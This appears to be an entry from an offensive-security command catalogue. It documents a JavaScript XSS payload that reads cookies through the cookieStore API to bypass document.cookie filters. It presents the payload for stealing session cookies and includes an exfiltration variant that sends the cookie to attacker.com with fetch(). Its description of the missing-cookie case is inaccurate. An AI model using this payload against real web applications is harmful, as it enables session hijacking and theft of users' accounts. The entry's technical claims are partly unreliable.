---
id: 5882c137-07ff-4593-9dbc-a5ae2b95cfc3
type: command
executor: javascript
data: >-
  window.cookieStore.get('$_COOKIE_NAME').then((cookieValue) => {
  alert(cookieValue.value); });
output: null
created_at: '2023-04-06T03:56:42.691581+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
platforms:
  - Browser
tags:
  - xss
  - cookie-theft
  - bypass
verified: true
validated: true
---

# Get-Cookie-Value-via-CookieStore

## Command

```javascript
window.cookieStore.get('$_COOKIE_NAME').then((cookieValue) => { alert(cookieValue.value); });
```

## Description

This JavaScript command retrieves the value of a specific cookie using the `window.cookieStore.get()` API, bypassing restrictions on `document.cookie`. It is designed for injection via XSS to steal sensitive cookies like session IDs in vulnerable web applications. Execute this in the browser console or as part of an injected script payload.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $_COOKIE_NAME | The name of the target cookie (e.g., 'JSESSIONID' or 'authToken') | Yes |

## Examples

### Basic Usage

```javascript
window.cookieStore.get('sessionID').then((cookieValue) => { alert(cookieValue.value); });
```

This alerts the value of the 'sessionID' cookie if it exists.

### Advanced Usage (Exfiltration)

```javascript
window.cookieStore.get('JSESSIONID').then((cookieValue) => { fetch('https://attacker.com/steal?cookie=' + encodeURIComponent(cookieValue.value)); });
```

This sends the cookie value to an attacker-controlled endpoint without alerting the user.

## Expected Output

Upon successful execution, the Promise resolves, and the callback triggers an alert displaying the cookie's raw value (e.g., "abc123def456") or initiates a network request. If the cookie does not exist, the Promise resolves to an empty array, and no value is alerted. In the browser console, you may see: `Promise { <resolved>: Cookie { name: 'JSESSIONID', value: 'abc123def456', ... } }`.

## Related

- [[procedures/Bypass-Document-Cookie-Blacklist-via-XSS-with-CookieStore-Get]]
